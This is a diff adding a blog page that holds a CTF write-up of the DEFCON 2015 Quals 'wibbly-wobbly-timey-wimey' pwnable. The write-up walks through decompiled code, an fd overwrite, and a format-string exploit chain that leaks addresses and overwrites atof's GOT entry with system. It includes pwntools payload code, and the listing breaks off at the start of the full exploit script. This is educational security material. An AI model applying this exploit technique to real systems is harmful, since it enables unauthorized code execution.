@@ -1,0 +1,866 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,Pwnable,Python,PPC,C,format_string,DEFCON," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hacking Tube 2.0" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Category: PwnablePoints: 2  Wibbly Wobbly Timey WimeyDon’t blink!wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606">
+<meta name="keywords" content="CTF,Pwnable,Python,PPC,C,format_string,DEFCON">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey">
+<meta property="og:url" content="https://bruce30262.github.io/2015/05/23/2015-05-23-defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/index.html">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:description" content="Category: PwnablePoints: 2  Wibbly Wobbly Timey WimeyDon’t blink!wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-01-03T15:08:05.595Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey">
+<meta name="twitter:description" content="Category: PwnablePoints: 2  Wibbly Wobbly Timey WimeyDon’t blink!wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://bruce30262.github.io/2015/05/23/2015-05-23-defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/"/>
+
+
+
+
+
+  <title>DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey | Hacking Tube 2.0</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-100090256-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hacking Tube 2.0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Security and stuff.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://bruce30262.github.io/2015/05/23/2015-05-23-defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bruce Chen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hacking Tube 2.0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2015-05-23T22:40:00+08:00">
+                2015-05-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2015/05/23/2015-05-23-defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2015/05/23/2015-05-23-defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>views
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>Category:</strong> Pwnable<br><strong>Points:</strong> 2</p>
+<blockquote>
+<p>Wibbly Wobbly Timey Wimey<br>Don’t blink!<br>wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606</p>
+</blockquote>
+<a id="more"></a>
+<p>32 bit ELF, with <strong>Partial RELRO</strong>, <strong>stack canary found</strong>, <strong>NX</strong> &amp; <strong>PIE</strong> enabled.<br>First we’ll have to play a game:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">You(^V&lt;&gt;) must find your way to the TARDIS(T) by avoiding the angels(A).</span><br><span class="line">Go through the exits(E) to get to the next room and continue your search.</span><br><span class="line">But, most importantly, don&apos;t blink!</span><br><span class="line">   012345678901234567890</span><br><span class="line">00                    E</span><br><span class="line">01                     </span><br><span class="line">02  A                  </span><br><span class="line">03               A     </span><br><span class="line">04 A                   </span><br><span class="line">05                     </span><br><span class="line">06               A     </span><br><span class="line">07                A    </span><br><span class="line">08                     </span><br><span class="line">09        V       A    </span><br><span class="line">10                  A  </span><br><span class="line">11                A    </span><br><span class="line">12              A      </span><br><span class="line">13                     </span><br><span class="line">14       A      A      </span><br><span class="line">15                     </span><br><span class="line">16                     </span><br><span class="line">17                     </span><br><span class="line">18                     </span><br><span class="line">19                     </span><br><span class="line">Your move (w,a,s,d,q):</span><br></pre></td></tr></table></figure>
+<p>We’ll have to control <code>V</code> with <strong>wasd</strong>, and the goal is to reach the <code>E</code> without being touched by those <code>A</code>s. In the final stage, <code>E</code> will be changed to <code>T</code>, and we’ll win the game by reaching <code>T</code>. After we beat the game, it will ask us to input a <code>TARDIS KEY</code>. At this moment, teammate <strong>yench</strong> started writing a python script to beat the game, while me and other teammates try to figure out what is the <code>TARDIS KEY</code>.</p>
+<p>We found the following C code:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_EB8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+16h] [bp-12h]@3</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+17h] [bp-11h]@9</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+18h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">int</span> (*v4)(<span class="keyword">void</span>); <span class="comment">// [sp+1Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">10</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TARDIS KEY: "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v4 = sub_EB8;</span><br><span class="line">  <span class="keyword">while</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">isalnum</span>(*(_BYTE *)v4 &amp; <span class="number">0x7F</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>) == <span class="number">1</span> &amp;&amp; buf != (*(_BYTE *)v4 &amp; <span class="number">0x7F</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      --v3;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = (<span class="keyword">int</span> (*)(<span class="keyword">void</span>))((<span class="keyword">char</span> *)v4 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v2 = getchar();</span><br><span class="line">  <span class="keyword">while</span> ( v2 != <span class="number">10</span> &amp;&amp; v2 != <span class="number">-1</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>So it looks like the <code>TARDIS KEY</code> is a 10-byte-long string, which every character is the machine code in <code>sub_EB8()</code>, and the machine code should be an <strong>alpha-numeric character</strong> after it does the <code>&amp; 0x7F</code> operation. After we dump the machine code and wrote a script to extract the correct byte, we got the <code>TARDIS KEY</code> = <code>&quot;UeSlhCAGEp&quot;</code>.  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">TARDIS KEY: UeSlhCAGEp</span><br><span class="line">Welcome to the TARDIS!</span><br><span class="line">Your options are: </span><br><span class="line">1. Turn on the console</span><br><span class="line">2. Leave the TARDIS</span><br><span class="line">Selection:</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">Looks like it only gave us 2 options. But after we reverse the binary, we found that it actually has 3 options. </span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line"> if ( LOBYTE(dword_50B0[0]) == &apos;3&apos; ) //dword_50B0[0] == our input</span><br><span class="line"> &#123;</span><br><span class="line">     if ( unk_50AC )</span><br><span class="line">     &#123;</span><br><span class="line">        choice3();</span><br><span class="line">     &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line">        puts(&quot;Invalid&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>We’ll have to make <code>unk_50AC</code> = 1. The only way to achieve this is to successfully turn on the TARDIS console:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( LOBYTE(dword_50B0[<span class="number">0</span>]) == <span class="string">'1'</span> )</span><br><span class="line">&#123;</span><br><span class="line">    LOBYTE(v4) = sub_E08();</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The TARDIS console is online!"</span>);</span><br><span class="line">        unk_50AC = <span class="number">1</span>;</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Access denied except between %s and %s\n"</span>, &amp;v7, &amp;v8);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The line <code>LOBYTE(v4) = sub_E08();</code> will do the following checking:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">sub_E08</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> dword_50A4 &gt; <span class="number">1431907180</span> &amp;&amp; dword_50A4 &lt;= <span class="number">1431907199</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>and we can only write <code>dword_50A4</code> in function <code>sub_BCB()</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> sub_BCB()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// eax@7</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [sp+18h] [bp-10h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+1Ch] [bp-Ch]@5</span></span><br><span class="line"></span><br><span class="line">  v0 = unk_50A8++;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">0xFFFFFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\nUnauthorized occupant detected...goodbye"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_50B0[<span class="number">2</span>] == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = fwrite(<span class="string">"Time vortex not responding\n"</span>, <span class="number">1u</span>, <span class="number">0x1B</span>u, <span class="built_in">stderr</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write(dword_50B0[<span class="number">2</span>], &amp;unk_2F4A, <span class="number">1u</span>);</span><br><span class="line">    v3 = read(dword_50B0[<span class="number">2</span>], &amp;buf, <span class="number">4u</span>); <span class="comment">// here</span></span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      dword_50A4 = buf; <span class="comment">//here</span></span><br><span class="line">    result = alarm(<span class="number">2u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Notice that <code>dword_50B0[2]</code> is the <strong>fd</strong>, and <code>dword_50B0[0]</code> is our <strong>input buffer</strong>(where the program store our <strong>options</strong>). By overflowing <code>dword_50B0[0]</code>, we can overwrite the value stored in <code>dword_50B0[2]</code> (the initial value is <strong>3</strong>, we’ll have to overwrite it to <strong>0</strong>(<code>stdin</code>) so we can write our input into <code>dword_50A4</code>). </p>
+<p>To sum up, here are the steps for enabling the option 3:</p>
+<ol>
+<li>Overwrite the <strong>fd</strong> (<code>dword_50B0[2]</code>) into <strong>0</strong> by overflowing <code>dword_50B0[0]</code></li>
+<li>Write the value into <code>dword_50A4</code> so it can pass the checking function <code>sub_E08()</code>. Notice that <code>sub_BCB()</code> is called by sending the <code>SIGALARM</code> signal, so be aware of the timing.</li>
+<li>Select option <strong>1</strong>, for turning on the TARDIS console.</li>
+<li>Option 3 will be enabled successfully after we turn on a TARDIS console.</li>
+</ol>
+<p>Here’s the payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> t.recvuntil(<span class="string">"Selection: "</span>)</span><br><span class="line">log.info(<span class="string">"overwriting fd..."</span>)</span><br><span class="line">t.send(<span class="string">"11111111\x00\n"</span>) <span class="comment"># overwrite fd into stdin</span></span><br><span class="line"><span class="keyword">print</span> t.recvuntil(<span class="string">"Selection: "</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>) <span class="comment"># wait for 2 second (until the service call sub_BCB())</span></span><br><span class="line">log.info(<span class="string">"enable choice 3..."</span>)</span><br><span class="line">t.send(<span class="string">"m+YU\n"</span>) <span class="comment"># m+YU = 1431907181</span></span><br><span class="line">t.send(<span class="string">"1\n"</span>)    <span class="comment"># turn on the TARDIS console</span></span><br><span class="line"><span class="keyword">print</span> t.recvuntil(<span class="string">"Selection: "</span>)</span><br><span class="line">log.info(<span class="string">"writing fd back..."</span>)</span><br><span class="line">t.send(<span class="string">"11111111\x03\n"</span>) <span class="comment"># write the fd back</span></span><br><span class="line"><span class="keyword">print</span> t.recvuntil(<span class="string">"Selection: "</span>)</span><br><span class="line">t.sendline(<span class="string">"3"</span>)</span><br><span class="line">t.recvuntil(<span class="string">"Coordinates: "</span>)</span><br><span class="line">log.success(<span class="string">"choice 3 enabled success"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>After we successfully enable option 3, let’s see what does it do:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">choice3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">double</span> v0; <span class="comment">// ST28_8@6</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@9</span></span><br><span class="line">  <span class="keyword">char</span> *nptr; <span class="comment">// [sp+24h] [bp-424h]@4</span></span><br><span class="line">  <span class="keyword">double</span> v3; <span class="comment">// [sp+30h] [bp-418h]@6</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+3Ch] [bp-40Ch]@2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+43Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Coordinates: "</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="keyword">if</span> ( sub_F7E(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;s, <span class="number">1023</span>, <span class="number">10</span>) == <span class="number">-1</span> ) <span class="comment">// input coordinates</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      nptr = <span class="built_in">strchr</span>(&amp;s, <span class="string">','</span>); <span class="comment">// split with ','</span></span><br><span class="line">      <span class="keyword">if</span> ( nptr )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid coordinates"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = atof(&amp;s);</span><br><span class="line">    v3 = atof(nptr + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%f, %f\n"</span>, v0, v3);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">51.492137</span> != v0 || <span class="number">-0.192878</span> != v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Coordinate "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;s); <span class="comment">// format string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">" is occupied by another TARDIS.  Materializing there "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"would rip a hole in time and space. Choose again."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"You safely travel to coordinates %s\n"</span>, &amp;s);</span><br><span class="line">  result = fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *MK_FP(__GS__, <span class="number">20</span>) != v5 )</span><br><span class="line">    terminate_proc();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>So it will let us input our coordinates, and check the coordinates’ value. If the coordinates are <strong>(51.492137, -0.192878)</strong>, it will trigger the <strong>format string vulnerability</strong>. After leaking some messages, we found that we’re able to leak the <strong>stack address</strong>. This is very important, since the binary has the <strong>PIE</strong> &amp; <strong>Partial RELRO</strong> protection, we don’t know where the text’s base address is, neither functions’ GOT address. But if we can leak the stack address, we can calculate the location that stored the return address, <strong>and leak the return address to calculate the text’s base address.</strong> After we have the text’s base address, we can <strong>calculate the functions’ GOT address, and leak the function pointer.</strong> After we got all the memory address, we can use the format string vulnerability to overwrite <code>atof</code>‘s GOT entry into <code>system</code>‘s address, and execute our command by entering our commands as the coordinates.</p>
+<p>So to sum up:</p>
+<ol>
+<li>Leak the stack address and calculate the return address’ location</li>
+<li>Leak the return address and calculate the text’s base address</li>
+<li>Calculate <code>atof</code>‘s GOT and leak the function pointer</li>
+<li>Calculate <code>system</code>‘s address and overwrite <code>atof</code>‘s GOT entry</li>
+<li>Input coordinates <strong>“[command], [garbage]”</strong> to execute our commands</li>
+</ol>
+<p>Here’s the exploit. The part that beating the game was done by <strong>yench</strong>, while the rest was done by me.</p>
+<figure class="highlight python"><figcaption><span>wwtw_exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 